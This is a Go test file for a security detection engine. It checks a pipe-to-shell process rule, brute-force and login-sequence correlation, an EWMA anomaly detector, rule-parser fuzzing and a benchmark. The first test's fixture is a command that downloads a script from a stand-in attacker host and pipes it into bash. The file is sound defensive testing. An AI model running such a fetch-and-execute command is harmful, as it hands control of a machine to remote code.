package detection

import (
	"fmt"
	"testing"
	"time"

	"github.com/fully-ai/sentinelmesh/internal/domain"
)

func TestSingleRuleCorrelationAndSequence(t *testing.T) {
	specs, _, err := ParseDefaultRules()
	if err != nil {
		t.Fatalf("ParseDefaultRules: %v", err)
	}
	eng := NewEngine(specs)
	base := time.Date(2026, 11, 18, 12, 0, 0, 0, time.UTC)

	// 1. Pipe-to-shell single event rule
	alerts := eng.Evaluate(domain.Event{
		ID:         "e-proc-1",
		TenantID:   "default",
		AgentID:    "a1",
		Host:       "node-1",
		Category:   domain.CategoryProcess,
		Action:     "started",
		OccurredAt: base,
		Process: &domain.ProcessInfo{
			PID:     4242,
			Name:    "bash",
			Cmdline: "curl -fsSL https://evil.example/install.sh | bash",
		},
	})
	if len(alerts) != 1 || alerts[0].RuleID != "SM-PROC-001" {
		t.Fatalf("expected SM-PROC-001 alert, got %+v", alerts)
	}
	if alerts[0].Explanation == "" {
		t.Fatal("expected human-readable rule explanation")
	}

	// 2. Threshold brute force correlation (5 failures in 120s) + Sequence (failure -> success)
	for i := 0; i < 4; i++ {
		got := eng.Evaluate(domain.Event{
			ID:         fmt.Sprintf("e-fail-%d", i),
			TenantID:   "default",
			AgentID:    "a1",
			Host:       "node-1",
			Category:   domain.CategoryAuth,
			Action:     "auth_failure",
			OccurredAt: base.Add(time.Duration(i) * 5 * time.Second),
			Auth:       &domain.AuthInfo{User: "ops", SourceIP: "198.51.100.44", Outcome: "failure"},
		})
		for _, a := range got {
			if a.RuleID == "SM-AUTH-CORR-001" {
				t.Fatalf("threshold rule fired too early at hit %d", i+1)
			}
		}
	}
	corrAlerts := eng.Evaluate(domain.Event{
		ID:         "e-fail-5",
		TenantID:   "default",
		AgentID:    "a1",
		Host:       "node-1",
		Category:   domain.CategoryAuth,
		Action:     "auth_failure",
		OccurredAt: base.Add(25 * time.Second),
		Auth:       &domain.AuthInfo{User: "ops", SourceIP: "198.51.100.44", Outcome: "failure"},
	})
	foundCorr := false
	for _, a := range corrAlerts {
		if a.RuleID == "SM-AUTH-CORR-001" && len(a.EventIDs) == 5 {
			foundCorr = true
		}
	}
	if !foundCorr {
		t.Fatalf("expected SM-AUTH-CORR-001 on 5th auth failure, got %+v", corrAlerts)
	}

	// Sequence completion: auth_success for same user & host
	seqAlerts := eng.Evaluate(domain.Event{
		ID:         "e-succ-1",
		TenantID:   "default",
		AgentID:    "a1",
		Host:       "node-1",
		Category:   domain.CategoryAuth,
		Action:     "auth_success",
		OccurredAt: base.Add(35 * time.Second),
		Auth:       &domain.AuthInfo{User: "ops", SourceIP: "198.51.100.44", Outcome: "success"},
	})
	foundSeq := false
	for _, a := range seqAlerts {
		if a.RuleID == "SM-AUTH-SEQ-002" {
			foundSeq = true
		}
	}
	if !foundSeq {
		t.Fatalf("expected sequence correlation alert SM-AUTH-SEQ-002, got %+v", seqAlerts)
	}
}

func TestEWMAAnomalyTracker(t *testing.T) {
	tr := NewAnomalyTracker(0.25, 3.0, 15)
	start := time.Date(2026, 11, 18, 10, 0, 0, 0, time.UTC)

	// 16 calm baseline minutes with 2 events/minute
	for m := 0; m < 16; m++ {
		for k := 0; k < 2; k++ {
			a := tr.Observe(domain.Event{
				ID:         fmt.Sprintf("calm-%d-%d", m, k),
				TenantID:   "default",
				AgentID:    "host-9",
				Host:       "host-9",
				Category:   domain.CategoryProcess,
				OccurredAt: start.Add(time.Duration(m)*time.Minute + time.Duration(k)*time.Second),
			})
			if a != nil {
				t.Fatalf("unexpected anomaly during calibration: %+v", a)
			}
		}
	}

	// Sudden spike in minute 16
	var triggered *domain.Alert
	for k := 0; k < 25; k++ {
		a := tr.Observe(domain.Event{
			ID:         fmt.Sprintf("spike-%d", k),
			TenantID:   "default",
			AgentID:    "host-9",
			Host:       "host-9",
			Category:   domain.CategoryProcess,
			OccurredAt: start.Add(16*time.Minute + time.Duration(k)*time.Second),
		})
		if a != nil {
			triggered = a
			break
		}
	}
	if triggered == nil || triggered.RuleID != "SM-ANOM-EWMA-001" {
		t.Fatalf("expected EWMA anomaly alert on burst spike, got %+v", triggered)
	}
}

func FuzzParseRuleYAML(f *testing.F) {
	for _, yml := range DefaultRuleYAMLSpecs {
		f.Add(yml)
	}
	f.Add("id: [\n")
	f.Fuzz(func(t *testing.T, raw string) {
		_, _ = ParseRuleYAML(raw)
	})
}

func BenchmarkRuleEngineEvaluate(b *testing.B) {
	specs, _, err := ParseDefaultRules()
	if err != nil {
		b.Fatal(err)
	}
	eng := NewEngine(specs)
	ev := domain.Event{
		ID:         "ev-bench",
		TenantID:   "default",
		AgentID:    "bench-agent",
		Host:       "bench-host",
		Category:   domain.CategoryProcess,
		Action:     "started",
		OccurredAt: time.Now().UTC(),
		Process:    &domain.ProcessInfo{PID: 123, Name: "python3", Cmdline: "/usr/bin/python3 -m http.server"},
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = eng.Evaluate(ev)
	}
}
